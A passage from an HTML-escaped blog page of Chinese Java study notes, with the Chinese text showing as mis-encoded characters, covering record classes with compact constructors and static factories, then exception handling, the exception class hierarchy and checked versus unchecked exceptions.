&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">y&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">format&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Point[x=%s, y=%s]&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">hashCode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>é™¤äº†ç”¨&lt;code>final&lt;/code>ä¿®é¥°classä»¥åŠæ¯ä¸ªå­—æ®µå¤–ï¼Œç¼–è¯‘å™¨è¿˜è‡ªåŠ¨ä¸ºæˆ‘ä»¬åˆ›å»ºäº†æž„é€ æ–¹æ³•ï¼Œå’Œå­—æ®µååŒåçš„æ–¹æ³•ï¼Œä»¥åŠè¦†å†™&lt;code>toString()&lt;/code>ã€&lt;code>equals()&lt;/code>å’Œ&lt;code>hashCode()&lt;/code>æ–¹æ³•&lt;/p>
&lt;ul>
&lt;li>å’Œ&lt;code>enum&lt;/code>ç±»ä¼¼ï¼Œæˆ‘ä»¬è‡ªå·±ä¸èƒ½ç›´æŽ¥ä»Ž&lt;code>Record&lt;/code>æ´¾ç”Ÿï¼Œåªèƒ½é€šè¿‡&lt;code>record&lt;/code>å…³é”®å­—ç”±ç¼–è¯‘å™¨å®žçŽ°ç»§æ‰¿&lt;/li>
&lt;li>å¦‚æžœè¦å¯¹å‚æ•°è¿›è¡Œæ£€æŸ¥ï¼Œå¯ä»¥ç”¨Compact Constructor&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">record&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Point&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">0&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¼–è¯‘å™¨ç”Ÿæˆçš„æ–¹æ³•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Point&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Record&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è¿™æ˜¯æˆ‘ä»¬ç¼–å†™çš„Compact Constructor:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">0&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è¿™æ˜¯ç¼–è¯‘å™¨ç»§ç»­ç”Ÿæˆçš„èµ‹å€¼ä»£ç :
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>ä½œä¸º&lt;code>record&lt;/code>çš„&lt;code>Point&lt;/code>ä»ç„¶å¯ä»¥é€šè¿‡&lt;code>of()&lt;/code>æ·»åŠ é™æ€æ–¹æ³•&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">record&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Point&lt;/span> &lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Point&lt;/span> &lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">z&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Point&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Point&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">123&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">456&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="å¼‚å¸¸å¤„ç†">å¼‚å¸¸å¤„ç†&lt;/h2>
&lt;h3 id="å¼‚å¸¸æ•èŽ·å¼‚å¸¸">å¼‚å¸¸&amp;amp;æ•èŽ·å¼‚å¸¸&lt;/h3>
&lt;ul>
&lt;li>Javaå†…ç½®å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼Œæ˜¯ä¸€ç§&lt;code>class&lt;/code>ï¼Œæœ¬èº«å¸¦æœ‰ç±»åž‹ä¿¡æ¯ï¼›å¼‚å¸¸å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹æŠ›å‡ºï¼Œä½†åªéœ€è¦åœ¨ä¸Šå±‚æ•èŽ·ï¼Œè¿™æ ·å¯ä»¥åšåˆ°å’Œæ–¹æ³•è°ƒç”¨åˆ†ç¦»&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>try {
String s = processFile(â€œC:\\test.txtâ€);
// ok:
} catch (FileNotFoundException e) {
// file not found:
} catch (SecurityException e) {
// no read permission:
} catch (IOException e) {
// io error:
} catch (Exception e) {
// other error:
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>ç»§æ‰¿å…³ç³»æ˜¯è¿™æ ·çš„&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220227002539516.png" alt="image-20220227002539516">&lt;/p>
&lt;p>&lt;code>Throwable&lt;/code>æ˜¯å¼‚å¸¸ä½“ç³»çš„æ ¹ï¼Œå®ƒç»§æ‰¿è‡ª&lt;code>Object&lt;/code>&lt;/p>
&lt;p>&lt;code>Error&lt;/code>è¡¨ç¤ºä¸¥é‡é”™è¯¯ï¼Œæ¯”å¦‚&lt;code>OutofMemoryError&lt;/code>, &lt;code>NoClassDefFoundError&lt;/code>, &lt;code>StackOverflowError&lt;/code>&lt;/p>
&lt;p>&lt;code>Exception&lt;/code>è¡¨ç¤ºè¿è¡Œæ—¶çš„å¼‚å¸¸ï¼Œå¯ä»¥è¢«æ•èŽ·å¹¶å¤„ç†ï¼Œæ¯”å¦‚&lt;code>NumberFormatException&lt;/code>, &lt;code>FileNotFoundException&lt;/code>, &lt;code>SocketException&lt;/code>ï¼›è¿˜åŒ…æ‹¬ä¸€äº›å¯ä¿®æ­£çš„è¯­æ³•é”™è¯¯ï¼Œæ¯”å¦‚&lt;code>NullPointerException&lt;/code>, &lt;code>IndexOutOfBoundsException&lt;/code>&lt;/p>
&lt;ul>
&lt;li>å¸¸ç”¨å¼‚å¸¸&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code class="language-ascii" data-lang="ascii">Exception
â”‚
â”œâ”€ RuntimeException
â”‚ â”‚
â”‚ â”œâ”€ NullPointerException
â”‚ â”‚
â”‚ â”œâ”€ IndexOutOfBoundsException
â”‚ â”‚
â”‚ â”œâ”€ SecurityException
â”‚ â”‚
â”‚ â””â”€ IllegalArgumentException
â”‚ â”‚
â”‚ â””â”€ NumberFormatException
â”‚
â”œâ”€ IOException
â”‚ â”‚
â”‚ â”œâ”€ UnsupportedCharsetException
â”‚ â”‚
â”‚ â”œâ”€ FileNotFoundException
â”‚ â”‚
â”‚ â””â”€ SocketException
â”‚
â”œâ”€ ParseException
â”‚
â”œâ”€ GeneralSecurityException
â”‚
â”œâ”€ SQLException
â”‚
â””â”€ TimeoutException
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>å¿…é¡»æ•èŽ·çš„å¼‚å¸¸ï¼ŒåŒ…æ‹¬&lt;code>Exception&lt;/code>åŠå…¶å­ç±»ï¼Œä½†ä¸åŒ…æ‹¬&lt;code>RuntimeException&lt;/code>åŠå…¶å­ç±»ï¼Œè¿™ç§ç±»åž‹çš„å¼‚å¸¸ç§°ä¸ºChecked Exception&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¦‚æžœä¸æ•èŽ·Checked Exceptionï¼Œç¼–è¯‘å™¨ä¼šæŠ¥é”™ï¼ŒåŽŸå› æ˜¯æ–¹æ³•å®šä¹‰æ—¶ä½¿ç”¨&lt;code>throws Xxx&lt;/code>è¡¨ç¤ºè¯¥æ–¹æ³•å¯èƒ½æŠ›å‡ºçš„å¼‚å¸¸ç±»åž‹ï¼Œå¯¼è‡´è°ƒç”¨æ–¹åœ¨è°ƒç”¨çš„æ—¶å€™ï¼Œå¿…é¡»å¼ºåˆ¶æ•èŽ·è¿™äº›å¼‚å¸¸&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¸éœ€è¦æ•èŽ·çš„å¼‚å¸¸ï¼ŒåŒ…æ‹¬&lt;code>Error&lt;/code>åŠå…¶å­ç±»ï¼Œ&lt;code>RuntimeException&lt;/code>åŠå…¶å­ç±»&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æ•èŽ·å¼‚å¸¸éœ€è¦æå‰import&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.UnsupportedEncodingException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Arrays&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">bs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">toGBK&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ä¸­æ–‡&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Arrays&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">bs&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">UnsupportedEncodingException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">toGBK&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">UnsupportedEncodingException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ç”¨æŒ‡å®šç¼–ç è½¬æ¢Stringä¸ºbyte[]:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GBK&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>åªè¦æ˜¯æ–¹æ³•å£°æ˜Žçš„Checked Exceptionï¼Œä¸åœ¨è°ƒç”¨å±‚æ•èŽ·ï¼Œä¹Ÿå¿…é¡»åœ¨æ›´é«˜çš„è°ƒç”¨å±‚æ•èŽ·ï¼›æ‰€æœ‰æœªæ•èŽ·çš„å¼‚å¸¸ï¼Œæœ€ç»ˆä¹Ÿå¿…é¡»åœ¨&lt;code>main()&lt;/code>æ–¹æ³•ä¸­æ•èŽ·&lt;/li>
&lt;li>æ‰€æœ‰å¼‚å¸¸éƒ½å¯ä»¥è°ƒç”¨&lt;code>printStackTrace()&lt;/code>æ–¹æ³•æ‰“å°å¼‚å¸¸æ ˆ&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">toGBK&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GBK&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">UnsupportedEncodingException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// å…ˆè®°ä¸‹æ¥å†è¯´:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
